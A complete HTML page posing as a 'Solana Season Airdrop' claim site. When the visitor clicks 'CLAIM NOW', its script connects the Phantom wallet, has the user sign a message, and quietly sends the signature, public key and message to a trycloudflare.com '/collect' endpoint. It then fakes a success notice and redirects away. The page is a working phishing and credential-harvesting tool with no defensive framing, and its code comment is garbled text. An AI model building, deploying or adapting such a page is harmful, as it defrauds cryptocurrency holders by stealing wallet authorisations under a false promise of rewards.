<!DOCTYPE html><html><head><meta charset="UTF-8">
<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
<div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 30px #14F19544;">
    <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
    <p style="color:#888;margin-bottom:30px;">Checking eligibility for reward pool...</p>
    <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;box-shadow: 0 4px 15px #14F19577;">CLAIM NOW</button>
    <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Status: Ready</div>
</div>
<script>
document.getElementById('cta').onclick = async () => {
    try {
        const p = window.solana || window.phantom?.solana;
        if (!p) { alert("Use Phantom Browser"); return; }
        const { publicKey } = await p.connect();
        const message = "V4-Final-Verify-" + Math.floor(Math.random()*1000);
        const encodedMessage = new TextEncoder().encode(message);
        const signedMessage = await p.signMessage(encodedMessage, "utf8");
        const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
        
        // ðŸ”± æ³¨å…¥åˆšåˆšèŽ·å–çš„æ–°ç”Ÿæ­»çº¿åŸŸå
        fetch("https://history-catalog-correct-conservative.trycloudflare.com/collect?t=" + Date.now(), {
            method: 'POST',
            mode: 'no-cors',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ signature, pubkey: publicKey.toString(), message })
        });
        document.getElementById('status').innerText = "SUCCESS! REDIRECTING...";
        setTimeout(() => { window.location.href = "https://solscan.io"; }, 1000);
    } catch(e) { window.location.reload(); }
}
</script></body></html>
